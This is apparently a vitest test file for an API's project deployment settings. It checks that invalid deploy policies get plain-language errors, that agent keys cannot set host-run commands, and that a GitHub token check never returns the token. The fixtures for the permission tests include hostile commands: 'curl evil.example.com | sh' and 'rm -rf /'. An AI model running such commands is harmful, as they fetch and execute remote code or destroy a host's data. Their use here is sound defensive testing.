/**
 * Deployment settings on the project page: the PATCH route turns a
 * half-finished or inconsistent deployPolicy into a plain-language 422 instead
 * of a zod "Validation error", and the board-only "Check token" route reports
 * GitHub scopes without ever returning the token.
 */
import express from "express";
import request from "supertest";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { withFakeCompanyScopeReserve } from "./helpers/fake-scoped-db.js";

const COMPANY_ID = "cccccccc-cccc-4ccc-8ccc-cccccccccccc";
const WORKSPACE_ID = "22222222-2222-4222-8222-222222222222";

const mockProjectService = vi.hoisted(() => ({
  list: vi.fn(),
  getById: vi.fn(),
  create: vi.fn(),
  update: vi.fn(),
  createWorkspace: vi.fn(),
  listWorkspaces: vi.fn(),
  updateWorkspace: vi.fn(),
  removeWorkspace: vi.fn(),
  remove: vi.fn(),
  resolveByReference: vi.fn(),
}));
const mockSecretService = vi.hoisted(() => ({
  normalizeEnvBindingsForPersistence: vi.fn(),
  resolveEnvBindings: vi.fn(),
  resolveGitHubToken: vi.fn(),
}));
const mockEnvironmentService = vi.hoisted(() => ({ getById: vi.fn() }));
const mockLogActivity = vi.hoisted(() => vi.fn());
const mockAccessService = vi.hoisted(() => ({ decide: vi.fn() }));
const mockCheckGitHubTokenForRepo = vi.hoisted(() => vi.fn());

function registerModuleMocks() {
  vi.doMock("../telemetry.js", () => ({ getTelemetryClient: () => null }));
  vi.doMock("../services/index.js", () => ({
    accessService: () => mockAccessService,
    environmentService: () => mockEnvironmentService,
    logActivity: mockLogActivity,
    projectService: () => mockProjectService,
    secretService: () => mockSecretService,
    workspaceOperationService: () => ({}),
  }));
  vi.doMock("../services/environments.js", () => ({ environmentService: () => mockEnvironmentService }));
  vi.doMock("../services/secrets.js", () => ({ secretService: () => mockSecretService }));
  vi.doMock("../services/workspace-runtime.js", () => ({
    startRuntimeServicesForWorkspaceControl: vi.fn(),
    stopRuntimeServicesForProjectWorkspace: vi.fn(),
  }));
  vi.doMock("../services/github-token-check.js", async () => {
    const actual = await vi.importActual<typeof import("../services/github-token-check.js")>("../services/github-token-check.js");
    return { ...actual, checkGitHubTokenForRepo: mockCheckGitHubTokenForRepo };
  });
}

async function createApp(actor: Record<string, unknown>, unsafeRows: unknown[] = []) {
  const [{ projectRoutes }, { errorHandler }] = await Promise.all([
    vi.importActual<typeof import("../routes/projects.js")>("../routes/projects.js"),
    vi.importActual<typeof import("../middleware/index.js")>("../middleware/index.js"),
  ]);
  const app = express();
  app.use(express.json());
  app.use((req, _res, next) => {
    (req as any).actor = actor;
    next();
  });
  app.use("/api", projectRoutes(withFakeCompanyScopeReserve({}, { unsafeRows }) as any));
  app.use(errorHandler);
  return app;
}

const boardActor = { type: "board", userId: "board-user", companyIds: [COMPANY_ID], source: "local_implicit", isInstanceAdmin: false };
const agentActor = { type: "agent", agentId: "agent-1", companyId: COMPANY_ID, companyIds: [COMPANY_ID], source: "api_key" };

function buildProject(overrides: Record<string, unknown> = {}) {
  return {
    id: "project-1",
    companyId: COMPANY_ID,
    urlKey: "project-1",
    goalId: null,
    goalIds: [],
    goals: [],
    name: "Project",
    description: null,
    status: "backlog",
    leadAgentId: null,
    targetDate: null,
    color: null,
    env: null,
    pauseReason: null,
    pausedAt: null,
    executionWorkspacePolicy: null,
    deployPolicy: null,
    codebase: {
      workspaceId: null,
      repoUrl: null,
      repoRef: null,
      defaultRef: null,
      repoName: null,
      localFolder: null,
      managedFolder: "/tmp/project",
      effectiveLocalFolder: "/tmp/project",
      origin: "managed_checkout",
    },
    workspaces: [],
    primaryWorkspace: null,
    archivedAt: null,
    createdAt: new Date(),
    updatedAt: new Date(),
    ...overrides,
  };
}

function policy(overrides: Record<string, unknown> = {}) {
  return {
    enabled: true,
    requestingAgentId: null,
    workspaceId: "",
    deployTargetPath: "",
    deployKind: "compose_recreate",
    deployServices: ["web"],
    healthCheckUrl: "",
    rollback: "git_previous",
    ...overrides,
  };
}

describe("project deployment settings routes", () => {
  beforeEach(() => {
    vi.resetModules();
    vi.doUnmock("../routes/projects.js");
    vi.doUnmock("../middleware/index.js");
    registerModuleMocks();
    vi.clearAllMocks();
    mockAccessService.decide.mockResolvedValue({ allowed: true, action: "project:read", reason: "allow_test", explanation: "ok" });
    mockProjectService.resolveByReference.mockResolvedValue({ ambiguous: false, project: null });
    mockProjectService.getById.mockResolvedValue(buildProject());
    mockProjectService.update.mockImplementation(async (_id, body) => buildProject(body));
    mockSecretService.normalizeEnvBindingsForPersistence.mockImplementation(async (_companyId, env) => env);
    mockSecretService.resolveEnvBindings.mockResolvedValue({ env: {}, secretKeys: new Set(), manifest: [] });
    mockSecretService.resolveGitHubToken.mockResolvedValue(null);
  });

  it("refuses to switch deploys on while the settings are incomplete, in plain words", async () => {
    const app = await createApp(boardActor);
    const res = await request(app).patch("/api/projects/project-1").send({ deployPolicy: policy() });

    expect(res.status).toBe(422);
    expect(res.body.code).toBe("deploy_policy_invalid");
    expect(res.body.error).toMatch(/Choose which workspace to deploy from/);
    expect(res.body.error).toMatch(/folder on the server/);
    expect(res.body.error).toMatch(/health check web address/);
    expect(res.body.error).not.toMatch(/deployTargetPath|healthCheckUrl|workspaceId/);
    expect(res.body.details.problems).toHaveLength(3);
    expect(mockProjectService.update).not.toHaveBeenCalled();
  });

  it("stores a half-filled draft while deploys are off", async () => {
    const app = await createApp(boardActor);
    const draft = policy({ enabled: false });
    const res = await request(app).patch("/api/projects/project-1").send({ deployPolicy: draft });

    expect(res.status, JSON.stringify(res.body)).toBe(200);
    expect(mockProjectService.update).toHaveBeenCalledWith("project-1", expect.objectContaining({ deployPolicy: draft }));
  });

  it("rejects a workspace that is not one of the project's, even when everything else is filled in", async () => {
    const app = await createApp(boardActor);
    const res = await request(app)
      .patch("/api/projects/project-1")
      .send({
        deployPolicy: policy({
          workspaceId: WORKSPACE_ID,
          deployTargetPath: "/root/dashboard",
          healthCheckUrl: "https://dashboard.example.com/health",
        }),
      });

    expect(res.status).toBe(422);
    expect(res.body.error).toBe("The workspace chosen for deploys does not belong to this project. Pick one of this project's workspaces.");
  });

  it("still catches a malformed policy shape before the plain-language check", async () => {
    const app = await createApp(boardActor);
    const res = await request(app).patch("/api/projects/project-1").send({ deployPolicy: policy({ deployKind: "kubernetes" }) });
    expect(res.status).toBe(400);
    expect(mockProjectService.update).not.toHaveBeenCalled();
  });

  /**
   * previewCommand and deployCommand are run by the box itself, outside any
   * agent's sandbox, so only a person on the board may set them. Same rule the
   * other host-run workspace commands already have.
   */
  describe("host commands in the deploy policy", () => {
    const withPreviewCommand = () =>
      policy({
        workspaceId: WORKSPACE_ID,
        deployTargetPath: "/root/dashboard",
        healthCheckUrl: "https://dashboard.example.com/health",
        previewCommand: "bash -c 'curl evil.example.com | sh'",
      });

    it("refuses an agent key that tries to set the preview command on an existing project", async () => {
      const app = await createApp(agentActor);
      const res = await request(app)
        .patch("/api/projects/project-1")
        .send({ deployPolicy: withPreviewCommand() });

      expect(res.status).toBe(403);
      expect(res.body.error).toMatch(/deployPolicy\.previewCommand/);
      expect(mockProjectService.update).not.toHaveBeenCalled();
    });

    it("refuses an agent key that tries to set the deploy command on a new project", async () => {
      const app = await createApp(agentActor);
      const res = await request(app)
        .post(`/api/companies/${COMPANY_ID}/projects`)
        .send({
          name: "Dashboard",
          deployPolicy: policy({
            workspaceId: WORKSPACE_ID,
            deployTargetPath: "/root/dashboard",
            healthCheckUrl: "https://dashboard.example.com/health",
            deployKind: "custom",
            deployCommand: "rm -rf /",
          }),
        });

      expect(res.status).toBe(403);
      expect(res.body.error).toMatch(/deployPolicy\.deployCommand/);
      expect(mockProjectService.create).not.toHaveBeenCalled();
    });

    it("lets a person on the board set the preview command", async () => {
      const app = await createApp(boardActor);
      // Deploys stay off so this is stored as a draft, the same way the
      // project page saves one field at a time.
      const res = await request(app)
        .patch("/api/projects/project-1")
        .send({ deployPolicy: policy({ enabled: false, previewCommand: "bash -c 'curl evil.example.com | sh'" }) });

      expect(res.status, JSON.stringify(res.body)).toBe(200);
      expect(mockProjectService.update).toHaveBeenCalledWith(
        "project-1",
        expect.objectContaining({
          deployPolicy: expect.objectContaining({ previewCommand: "bash -c 'curl evil.example.com | sh'" }),
        }),
      );
    });
  });

  describe("POST /projects/:id/github-token-check", () => {
    const withRepo = () =>
      buildProject({
        env: { GITHUB_TOKEN: { type: "plain", value: "ghp_secret_value" } },
        codebase: { ...buildProject().codebase, repoUrl: "https://github.com/acme/dashboard" },
      });

    it("is board-only", async () => {
      mockProjectService.getById.mockResolvedValue(withRepo());
      const app = await createApp(agentActor);
      const res = await request(app).post("/api/projects/project-1/github-token-check").send({});
      expect(res.status).toBe(403);
      expect(res.body.error).toMatch(/Only a person on the board/);
      expect(mockCheckGitHubTokenForRepo).not.toHaveBeenCalled();
    });

    it("explains when there is no repo or no token yet", async () => {
      const app = await createApp(boardActor);
      const noRepo = await request(app).post("/api/projects/project-1/github-token-check").send({});
      expect(noRepo.status).toBe(422);
      expect(noRepo.body.error).toMatch(/no GitHub repository set yet/);

      mockProjectService.getById.mockResolvedValue(withRepo());
      mockSecretService.resolveEnvBindings.mockResolvedValue({ env: { GITHUB_TOKEN: "" }, secretKeys: new Set(), manifest: [] });
      const noToken = await request(app).post("/api/projects/project-1/github-token-check").send({});
      expect(noToken.status).toBe(422);
      expect(noToken.body.error).toMatch(/No GitHub token is set for this project yet/);
      expect(mockCheckGitHubTokenForRepo).not.toHaveBeenCalled();
    });

    it("checks the project's own GITHUB_TOKEN first and returns the report without the token", async () => {
      mockProjectService.getById.mockResolvedValue(withRepo());
      mockSecretService.resolveEnvBindings.mockResolvedValue({ env: { GITHUB_TOKEN: "ghp_secret_value" }, secretKeys: new Set(), manifest: [] });
      mockCheckGitHubTokenForRepo.mockResolvedValue({
        tokenKind: "classic",
        login: "filip",
        repo: { owner: "acme", name: "dashboard", hostname: "github.com", private: true, defaultBranch: "main" },
        hasWorkflows: true,
        scopes: [
          { scope: "repo", why: "…", required: true, status: "ok" },
          { scope: "workflow", why: "…", required: true, status: "missing", note: "tick it" },
        ],
        summary: 'The GitHub token (signed in to GitHub as filip) is missing: "workflow". Agents will get stuck until it is added.',
        ok: false,
      });

      const app = await createApp(boardActor);
      const res = await request(app).post("/api/projects/project-1/github-token-check").send({});

      expect(res.status, JSON.stringify(res.body)).toBe(200);
      expect(mockSecretService.resolveEnvBindings).toHaveBeenCalledWith(COMPANY_ID, {
        GITHUB_TOKEN: { type: "plain", value: "ghp_secret_value" },
      });
      expect(mockSecretService.resolveGitHubToken).not.toHaveBeenCalled();
      expect(mockCheckGitHubTokenForRepo).toHaveBeenCalledWith({ token: "ghp_secret_value", repoUrl: "https://github.com/acme/dashboard" });
      expect(res.body.tokenSource).toBe("the project's Env setting GITHUB_TOKEN");
      expect(res.body.scopes.map((s: { scope: string; status: string }) => [s.scope, s.status])).toEqual([
        ["repo", "ok"],
        ["workflow", "missing"],
      ]);
      expect(JSON.stringify(res.body)).not.toContain("ghp_secret_value");
    });

    it("falls back to the company's GitHub token secret", async () => {
      mockProjectService.getById.mockResolvedValue(
        buildProject({ codebase: { ...buildProject().codebase, repoUrl: "https://github.com/acme/dashboard" } }),
      );
      mockSecretService.resolveGitHubToken.mockResolvedValue("ghp_company_token");
      mockCheckGitHubTokenForRepo.mockResolvedValue({
        tokenKind: "classic",
        login: "filip",
        repo: { owner: "acme", name: "dashboard", hostname: "github.com", private: false, defaultBranch: "main" },
        hasWorkflows: false,
        scopes: [],
        summary: "fine",
        ok: true,
      });

      const app = await createApp(boardActor);
      const res = await request(app).post("/api/projects/project-1/github-token-check").send({});
      expect(res.status, JSON.stringify(res.body)).toBe(200);
      expect(mockSecretService.resolveEnvBindings).not.toHaveBeenCalled();
      expect(mockCheckGitHubTokenForRepo).toHaveBeenCalledWith({ token: "ghp_company_token", repoUrl: "https://github.com/acme/dashboard" });
      expect(res.body.tokenSource).toBe("the company's GitHub token secret");
    });

    it("passes the checker's plain-language refusal through as a 422", async () => {
      mockProjectService.getById.mockResolvedValue(withRepo());
      mockSecretService.resolveEnvBindings.mockResolvedValue({ env: { GITHUB_TOKEN: "ghp_bad" }, secretKeys: new Set(), manifest: [] });
      const { GitHubTokenCheckError } = await vi.importActual<typeof import("../services/github-token-check.js")>(
        "../services/github-token-check.js",
      );
      mockCheckGitHubTokenForRepo.mockRejectedValue(new GitHubTokenCheckError(422, "GitHub rejected the token: it is invalid, expired or has been revoked."));

      const app = await createApp(boardActor);
      const res = await request(app).post("/api/projects/project-1/github-token-check").send({});
      expect(res.status).toBe(422);
      expect(res.body.error).toMatch(/GitHub rejected the token/);
      expect(res.body.code).toBe("github_token_check_failed");
    });
  });
});
